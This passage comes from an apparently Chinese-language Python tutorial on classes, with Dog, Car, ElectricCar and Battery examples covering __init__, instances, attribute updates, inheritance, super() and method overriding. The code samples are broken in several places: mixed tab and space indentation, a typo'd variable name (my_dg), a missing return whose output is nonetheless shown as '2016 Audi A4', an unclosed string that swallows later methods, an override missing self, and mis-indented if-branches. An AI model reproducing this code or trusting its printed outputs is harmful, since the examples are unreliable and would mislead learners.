class="string">&quot;&quot;&quot;模拟小狗被命令时蹲下&quot;&quot;&quot;</span></span><br><span class="line">   	<span class="built_in">print</span>(self.name.title() + <span class="string">&quot; is now sitting.&quot;</span>)</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">  		<span class="string">&quot;&quot;&quot;模拟小狗被命令时打滚&quot;&quot;&quot;</span></span><br><span class="line">   	<span class="built_in">print</span>(self.name.title() + <span class="string">&quot; rolled over!&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>__init__()是一个特殊的方法,对定义类的属性进行初始化，python自动调用，类似于C++的构造函数。</p>
<p>注意:init左右两边各有2个”__“是”__“(两个英文下划线)不是”_”</p>
<p>在这个方法的定义中，形参self必不可少，还必须位于其他形参的前面。</p>
<p>Python调用这个__init__()方法来创建类实例时，将自动传入实参self。每个与类相关联的方法调用都自动传递实参self，它是一个指向实例本身的引用，让实例能够访问类中的属性和方法。</p>
</blockquote>
<h4 id="创建类实例"><a href="#创建类实例" class="headerlink" title="创建类实例"></a>创建类实例</h4><p><strong>调用实例的属性</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line">my_dog=Dog(<span class="string">&quot;willie&quot;</span>,<span class="number">6</span>)<span class="comment">#创建抽象类的实例化对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span>+ my_dog.name.title())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span>+<span class="built_in">str</span>(my_dog.age)+<span class="string">&quot;years old.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">My dog is 6 years old.</span></span><br></pre></td></tr></table></figure>

<p><strong>调用实例的方法</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line">my_dg=Dog(<span class="string">&#x27;willie&#x27;</span>,<span class="number">6</span>)<span class="comment">#创建抽象类的实例化对象</span></span><br><span class="line">my_dog.sit()<span class="comment">#利用对象调用其包含的方法</span></span><br><span class="line">my_dog.roll_over()<span class="comment">#利用对象调用其包含的方法</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Willie is now sitting.</span><br><span class="line">Willie rolled over!</span><br></pre></td></tr></table></figure>

<p><strong>创建多个实例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#dog.py</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sit</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;is now sitting.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">roll_over</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.name.title() + <span class="string">&quot;rolled over!&quot;</span>)</span><br><span class="line"><span class="comment">#创建多个实例对象      </span></span><br><span class="line">my_dog = Dog(<span class="string">&#x27;willie&#x27;</span>, <span class="number">6</span>)</span><br><span class="line">your_dog = Dog(<span class="string">&#x27;lucy&#x27;</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment">#对my_dog对象进行运用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog&#x27;s name is &quot;</span> + my_dog.name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My dog is &quot;</span> + <span class="built_in">str</span>(my_dog.age) + <span class="string">&quot; years old.&quot;</span>)  </span><br><span class="line">my_dog.sit()</span><br><span class="line"><span class="comment">#对your_dog对象进行运用</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nYour dog&#x27;s name is &quot;</span> + your_dog.name.title() + <span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your dog is &quot;</span> + <span class="built_in">str</span>(your_dog.age) + <span class="string">&quot; years old.&quot;</span>)</span><br><span class="line">your_dog.sit()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">My dog<span class="string">&#x27;s name is Willie.</span></span><br><span class="line"><span class="string">My dog is 6 years old.</span></span><br><span class="line"><span class="string">Willie is now sitting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your dog&#x27;</span>s name is Lucy.</span><br><span class="line">Your dog is 3 years old.</span><br><span class="line">Lucy is now sitting.</span><br></pre></td></tr></table></figure>

<h4 id="给属性指定默认值"><a href="#给属性指定默认值" class="headerlink" title="给属性指定默认值"></a>给属性指定默认值</h4><blockquote>
<p>类中的每个属性都必须有初始值，哪怕这个值是0或空字符串。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())</span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 0 miles on it.</span><br></pre></td></tr></table></figure>

<h4 id="修改属性的值"><a href="#修改属性的值" class="headerlink" title="修改属性的值"></a>修改属性的值</h4><blockquote>
<p>三种不同的方式修改属性的值：</p>
<ul>
<li>直接通过实例进行修改；</li>
<li>通过方法进行设置；</li>
<li>通过方法进行递增（增加特定的值）。</li>
</ul>
</blockquote>
<p><strong>直接通过实例进行修改</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">my_new_car = Car(<span class="string">&#x27;audi&#x27;</span>, <span class="string">&#x27;a4&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_new_car.get_descriptive_name())	</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;修改属性值&#x27;&#x27;&#x27;</span></span><br><span class="line">my_new_car.odometer_reading = <span class="number">23</span></span><br><span class="line">my_new_car.read_odometer()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span> Audi A4</span><br><span class="line">This car has <span class="number">23</span> miles on it.</span><br></pre></td></tr></table></figure>

<p><strong>通过方法进行设置属性值</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it</span></span><br><span class="line"><span class="string">	def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">		&quot;</span><span class="string">&quot;&quot;</span>将里程表读数设置为指定的值<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">my_new_car = Car(&#x27;audi&#x27;, &#x27;a4&#x27;, 2016)</span></span><br><span class="line"><span class="string">print(my_new_car.get_descriptive_name())</span></span><br><span class="line"><span class="string">my_new_car.update_odometer(23)</span></span><br><span class="line"><span class="string">my_new_car.read_odometer()             </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Audi A4</span><br><span class="line">This car has 23 miles on it.</span><br></pre></td></tr></table></figure>

<p><strong>通过方法对属性的值进行递增</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化描述汽车的属性&quot;&quot;&quot;</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">        self.odometer_reading = <span class="number">0</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;返回整洁的描述性信息&quot;&quot;&quot;</span></span><br><span class="line">		long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条指出汽车里程的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it</span></span><br><span class="line"><span class="string">	def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">		&quot;</span><span class="string">&quot;&quot;</span>将里程表读数设置为指定的值<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">	def increment_odometer(self, miles):</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>将里程表读数增加指定的量<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        self.odometer_reading += miles</span></span><br><span class="line"><span class="string">my_used_car = Car(&#x27;subaru&#x27;, &#x27;outback&#x27;, 2013)</span></span><br><span class="line"><span class="string">print(my_used_car.get_descriptive_name())</span></span><br><span class="line"><span class="string">my_used_car.update_odometer(23500)</span></span><br><span class="line"><span class="string">my_used_car.read_odometer()</span></span><br><span class="line"><span class="string">my_used_car.increment_odometer(100)</span></span><br><span class="line"><span class="string">my_used_car.read_odometer()             </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2013 Subaru Outback</span><br><span class="line">This car has 23500 miles on it.</span><br><span class="line">This car has 23600 miles on it.</span><br></pre></td></tr></table></figure>

<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><blockquote>
<p>使用super()函数将父类和子类串联起来。</p>
<p>创建子类的实例时，Python首先需要完成的任务是给父类的所有属性赋值。创建子类时，父类必须包含在当前文件中，且位于子类前面。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;初始化父类的属性&quot;&quot;&quot;</span></span><br><span class="line"> 		<span class="built_in">super</span>().__init__(make, model, year)</span><br><span class="line"></span><br><span class="line">my_tesla = ElectricCar(<span class="string">&#x27;tesla&#x27;</span>, <span class="string">&#x27;model s&#x27;</span>, <span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2016</span> Tesla Model S</span><br></pre></td></tr></table></figure>

<h4 id="给子类定义属性和方法"><a href="#给子类定义属性和方法" class="headerlink" title="给子类定义属性和方法"></a>给子类定义属性和方法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent aspects of a car,specific to electric vehicles.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，在初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">       </span><br><span class="line">my_tesla = ElectricCar(<span class="string">&quot;tesla&quot;</span>,<span class="string">&#x27;model s&#x27;</span>,<span class="number">2016</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tesla.get_descriptive_name())</span><br><span class="line">my_tesla.describe_battery()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2016 Tesla Model S</span><br><span class="line">This car has a 70-kWh battery.</span><br></pre></td></tr></table></figure>

<h4 id="父类函数重载"><a href="#父类函数重载" class="headerlink" title="父类函数重载"></a>父类函数重载</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):<span class="comment">#构造函数对类进行初始化</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This size of  gas tank of the car is &quot;</span>+ <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Represent aspects of a car,specific to electric vehicles.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,make,model,year</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        电动汽车的独特之处</span></span><br><span class="line"><span class="string">        初始化父类的属性，在初始化电动汽车特有的属性</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(make,model,year)</span><br><span class="line">        self.battery_size = <span class="number">70</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">	<span class="comment">#对父类的fill_gas_tank()方法进行重载</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>():</span><br><span class="line">		<span class="string">&quot;&quot;&quot;电动车没有油箱&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This car doesn&#x27;t need a tank!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="将实例用作属性"><a href="#将实例用作属性" class="headerlink" title="将实例用作属性"></a>将实例用作属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#electric_car.py</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟汽车的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):<span class="comment">#构造函数对类进行初始化</span></span><br><span class="line">        self.make = make</span><br><span class="line">        self.model = model</span><br><span class="line">        self.year = year</span><br><span class="line">		self.odometer_reading = <span class="number">0</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_descriptive_name</span>(<span class="params">self</span>):</span><br><span class="line">        long_name = <span class="built_in">str</span>(self.year) + <span class="string">&#x27; &#x27;</span> + self.make + <span class="string">&#x27; &#x27;</span> + self.model</span><br><span class="line">        <span class="keyword">return</span> long_name.title()</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">read_odometer</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has &quot;</span> + <span class="built_in">str</span>(self.odometer_reading) + <span class="string">&quot; miles on it.&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">update_odometer</span>(<span class="params">self, mileage</span>):</span><br><span class="line">		<span class="keyword">if</span> mileage &gt;= self.odometer_reading:</span><br><span class="line">			self.odometer_reading = mileage</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;You can&#x27;t roll back an odometer!&quot;</span>)</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">increment_odometer</span>(<span class="params">self, miles</span>):</span><br><span class="line">		self.odometer_reading += miles</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill_gas_tank</span>(<span class="params">self,size</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;This size of  gas tank of the car is &quot;</span>+ <span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Battery</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一次模拟电动汽车电瓶的简单尝试&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, battery_size=<span class="number">70</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化电瓶的属性&quot;&quot;&quot;</span></span><br><span class="line">		self.battery_size = battery_size</span><br><span class="line"> 	<span class="keyword">def</span> <span class="title function_">describe_battery</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;打印一条描述电瓶容量的消息&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;This car has a &quot;</span> + <span class="built_in">str</span>(self.battery_size) + <span class="string">&quot;-kWh battery.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_range</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打印一条消息，指出电瓶的续航里程&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.battery_size == <span class="number">70</span>:</span><br><span class="line">        <span class="built_in">range</span> = <span class="number">240</span></span><br><span class="line">        <span class="keyword">elif</span> self.battery_size == <span class="number">85</span>:</span><br><span class="line">        <span class="built_in">range</span> = <span class="number">270</span></span><br><span class="line">        message = <span class="string">&quot;This car can go approximately &quot;</span> + <span class="built_in">str</span>(<span class="built_in">range</span>)</span><br><span class="line">        message += <span class="string">&quot; miles on a full charge.&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">	<span class="string">&quot;&quot;&quot;电动汽车的独特之处&quot;&quot;&quot;</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, make, model, year</span>):</span><br><span class="line">		<span class="string">&quot;&quot;&quot;初始化父类的属性，再初始化电动汽车特有的属性&quot;&quot;&quot;</span></span><br><span class="line">		<span class="built_in">super</span>().__init__(make, model, year)</span><br><span class="line">		self.battery = Battery()</span><br><span class="line">        </span><br><span class="line">my_tesla = ElectricCar(<span 